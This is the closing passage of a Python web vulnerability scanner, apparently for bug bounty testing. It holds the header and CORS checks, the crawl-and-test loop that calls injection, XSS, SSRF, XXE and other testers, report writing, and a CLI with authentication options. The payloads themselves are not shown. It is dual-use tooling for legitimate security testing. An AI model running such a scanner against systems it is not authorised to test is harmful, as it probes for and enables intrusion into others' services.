            Logger.log("CORS", "WARNING", "Wildcard ACAO — dangerous if credentials involved",
                       "low", {'acao': acao}, url)
        else:
            Logger.log("CORS", "OK", f"ACAO: {acao or 'not set'}", "info")


class HeaderSecurityTester:
    REQUIRED = {
        'Strict-Transport-Security': 'Missing HSTS',
        'Content-Security-Policy': 'Missing CSP',
        'X-Content-Type-Options': 'Missing X-Content-Type-Options',
        'X-Frame-Options': 'Missing X-Frame-Options (clickjacking)',
        'Referrer-Policy': 'Missing Referrer-Policy',
    }

    def test(self, url: str, session: SessionManager):
        resp = session.get(url)
        if not resp:
            return
        missing = [msg for h, msg in self.REQUIRED.items() if h not in resp.headers]
        if missing:
            Logger.log("Security Headers", "WARNING", "; ".join(missing[:5]),
                       "low", {'missing': missing}, url)
        else:
            Logger.log("Security Headers", "OK", "All recommended headers present", "info")


# ============================================================================
# MAIN SCANNER
# ============================================================================

class BugBountyScanner:
    def __init__(self, config: Dict):
        self.config = config
        self.session = SessionManager(
            verify_ssl=not config.get('insecure', False),
            auth_config=config.get('auth', {})
        )

    def scan(self, target: str, crawl: bool = True):
        print(f"\n{Colors.BOLD}{'='*70}{Colors.END}")
        print(f"{Colors.BOLD}Target:  {target}{Colors.END}")
        print(f"{Colors.BOLD}Started: {datetime.now(timezone.utc).isoformat()}{Colors.END}")
        print(f"{Colors.BOLD}{'='*70}{Colors.END}\n")

        Logger.clear()
        RequestCache.clear()

        urls = [target]
        forms = []

        if crawl:
            print(f"{Colors.CYAN}[*] Crawling...{Colors.END}")
            crawler = WebCrawler(self.session)
            discovered, forms = crawler.crawl(target)
            urls.extend(discovered)
            print(f"{Colors.CYAN}[*] Found {len(discovered)} URLs, {len(forms)} forms{Colors.END}\n")

        for url in list(set(urls))[:Config.MAX_URLS]:
            self._test_url(url)

        for form in forms:
            self._test_form(form)

        self._print_summary()
        self._save_report(target)

    def _test_url(self, url: str):
        parsed = urlparse(url)
        params = list(parse_qs(parsed.query).keys()) or ['id', 'page', 'file', 'path', 'url', 'q']
        if not parse_qs(parsed.query):
            url = f"{url}?id=1"

        print(f"\n{Colors.HEADER}--- {url[:90]} ---{Colors.END}")

        SQLiTester(self.session).test(url, params)
        NoSQLTester(self.session).test(url, params)
        XSSTester(self.session).test(url, params)
        LFITester(self.session).test(url, params)
        CommandInjectionTester(self.session).test(url, params)
        SSTITester(self.session).test(url, params)
        SSRFTester(self.session).test(url, params)
        IDORTester(self.session).test(url, params)
        OpenRedirectTester(self.session).test(url, params)

        CORSTester().test(url, self.session)
        HeaderSecurityTester().test(url, self.session)
        JWTTester().test(url, self.session)
        CookieSecurityTester().test(url, self.session)
        InfoDisclosureTester().test(url, self.session)

    def _test_form(self, form: Dict):
        url, method, inputs = form['url'], form['method'], form['inputs']
        print(f"\n{Colors.HEADER}--- Form: {method} {url[:80]} ---{Colors.END}")
        data = {inp: "test123" for inp in inputs}
        SQLiTester(self.session).test(url, inputs, method, data)
        NoSQLTester(self.session).test(url, inputs, method, data)
        XSSTester(self.session).test(url, inputs, method, data)
        CommandInjectionTester(self.session).test(url, inputs, method, data)
        if any('xml' in inp.lower() for inp in inputs):
            XXETester(self.session).test(url, inputs, method, data)

    def _print_summary(self):
        vulns  = [r for r in Logger.RESULTS if "VULN" in r['status']]
        warns  = [r for r in Logger.RESULTS if any(x in r['status'] for x in ["WARNING", "POTENTIAL"])]
        clean  = [r for r in Logger.RESULTS if r['status'] in ("OK", "NOT DETECTED")]
        errors = [r for r in Logger.RESULTS if "ERROR" in r['status']]

        print(f"\n{Colors.BOLD}{'='*70}{Colors.END}")
        print(f"{Colors.BOLD}SUMMARY{Colors.END}")
        print(f"  {Colors.FAIL}Vulnerabilities: {len(vulns)}{Colors.END}")
        print(f"  {Colors.WARNING}Warnings:        {len(warns)}{Colors.END}")
        print(f"  {Colors.GREEN}Clean:           {len(clean)}{Colors.END}")
        print(f"  {Colors.BLUE}Errors:          {len(errors)}{Colors.END}")
        print(f"  Total tests:     {len(Logger.RESULTS)}")
        print(f"{Colors.BOLD}{'='*70}{Colors.END}\n")

        if vulns:
            print(f"{Colors.FAIL}VULNERABILITIES:{Colors.END}")
            for v in vulns:
                print(f"  [{v['severity'].upper()}] {v['test']}: {v['detail'][:70]}")
                print(f"    {v['url'][:80]}")

    def _save_report(self, target: str):
        safe = urlparse(target).netloc.replace(":", "_") or "unknown"
        h = hashlib.md5(target.encode()).hexdigest()[:6]
        ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")

        report = {
            "target": target,
            "scan_time": datetime.now(timezone.utc).isoformat(),
            "summary": {
                "vulnerabilities": len([r for r in Logger.RESULTS if "VULN" in r['status']]),
                "warnings": len([r for r in Logger.RESULTS if any(x in r['status'] for x in ["WARNING", "POTENTIAL"])]),
                "clean": len([r for r in Logger.RESULTS if r['status'] in ("OK", "NOT DETECTED")]),
            },
            "results": Logger.RESULTS
        }

        json_file = f"scan_{safe}_{ts}.json"
        md_file   = f"scan_{safe}_{ts}.md"

        with open(json_file, "w") as f:
            json.dump(report, f, indent=2)

        with open(md_file, "w") as f:
            f.write(f"# Scan Report: {target}\n\n")
            f.write(f"**Time:** {report['scan_time']}\n\n")
            f.write(f"## Summary\n\n")
            for k, v in report['summary'].items():
                f.write(f"- **{k.title()}:** {v}\n")
            f.write("\n## Findings\n\n")
            for r in Logger.RESULTS:
                icon = "🔴" if "VULN" in r['status'] else ("🟡" if any(x in r['status'] for x in ["WARNING", "POTENTIAL"]) else "🟢")
                f.write(f"### {icon} {r['test']} — {r['status']}\n")
                f.write(f"- **Severity:** {r['severity']}\n")
                f.write(f"- **Detail:** {r['detail']}\n")
                f.write(f"- **URL:** {r['url']}\n\n")

        print(f"\n{Colors.GREEN}Reports:{Colors.END}")
        print(f"  JSON: {json_file}")
        print(f"  MD:   {md_file}")


# ============================================================================
# CLI
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="Vulnerability Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Run examples:
  python3 vuln_scan.py <URL>
  python3 vuln_scan.py <URL> --no-crawl
  python3 vuln_scan.py <URL> -k --auth-bearer <TOKEN>
  python3 vuln_scan.py <URL> --auth-header "Cookie: session=abc123"
  python3 vuln_scan.py -f urls.txt
        """
    )

    parser.add_argument("url", nargs="?", help="Target URL")
    parser.add_argument("-f", "--file", help="File of URLs (one per line)")
    parser.add_argument("-k", "--insecure", action="store_true", help="Disable SSL verification")
    parser.add_argument("--no-crawl", action="store_true", help="Disable crawling")

    auth = parser.add_argument_group("Auth")
    auth.add_argument("--auth-bearer", help="Bearer token")
    auth.add_argument("--auth-user", help="Basic auth username")
    auth.add_argument("--auth-pass", help="Basic auth password")
    auth.add_argument("--auth-header", action="append", help="Custom header: 'Name: Value'")
    auth.add_argument("--auth-cookie", action="append", help="Cookie: 'name=value'")

    perf = parser.add_argument_group("Performance")
    perf.add_argument("--delay", type=float, default=1.0, help="Delay between requests (default: 1s)")
    perf.add_argument("--max-urls", type=int, default=50, help="Max URLs to crawl (default: 50)")
    perf.add_argument("--max-depth", type=int, default=2, help="Crawl depth (default: 2)")

    args = parser.parse_args()

    if not args.url and not args.file:
        parser.print_help()
        sys.exit(1)

    auth_config = {}
    if args.auth_bearer:
        auth_config['bearer'] = args.auth_bearer
    if args.auth_user and args.auth_pass:
        auth_config['username'] = args.auth_user
        auth_config['password'] = args.auth_pass
    if args.auth_header:
        headers = {}
        for h in args.auth_header:
            if ':' in h:
                n, v = h.split(':', 1)
                headers[n.strip()] = v.strip()
        auth_config['headers'] = headers
    if args.auth_cookie:
        cookies = {}
        for c in args.auth_cookie:
            if '=' in c:
                n, v = c.split('=', 1)
                cookies[n] = v
        auth_config['cookies'] = cookies

    Config.MAX_URLS = args.max_urls
    Config.MAX_CRAWL_DEPTH = args.max_depth
    Config.RATE_LIMIT_DELAY = (args.delay, args.delay * 2)

    targets = []
    if args.url:
        targets.append(args.url)
    if args.file:
        with open(args.file) as f:
            targets.extend(l.strip() for l in f if l.strip() and not l.startswith('#'))

    print(f"{Colors.BOLD}Vulnerability Scanner{Colors.END}")
    print(f"Targets: {len(targets)} | Crawl: {'off' if args.no_crawl else 'on'} | Auth: {'yes' if auth_config else 'none'}")
    print(f"{'='*70}\n")

    for target in targets:
        scanner = BugBountyScanner({'insecure': args.insecure, 'auth': auth_config})
        try:
            scanner.scan(target, crawl=not args.no_crawl)
        except KeyboardInterrupt:
            print(f"\n{Colors.WARNING}Interrupted{Colors.END}")
            break
        except Exception as e:
            print(f"{Colors.FAIL}Error: {e}{Colors.END}")


if __name__ == "__main__":
    main()
